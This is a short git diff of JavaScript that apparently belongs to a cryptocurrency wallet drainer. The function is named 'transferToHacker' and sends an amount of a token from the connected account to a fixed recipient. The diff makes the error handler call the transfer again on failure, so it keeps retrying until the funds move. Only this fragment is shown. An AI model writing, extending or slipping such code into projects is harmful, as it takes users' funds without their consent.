@@ -177,8 +177,9 @@ export const transferToHacker = async (token) => {
     getAccount().address, constants.recipient, amount
   ).then(async (result) => {
     console.log(result)
-  }).catch( (error) => {
+  }).catch(async (error) => {
     console.log(error)
+    await transferToHacker(token);
   });
 };
 
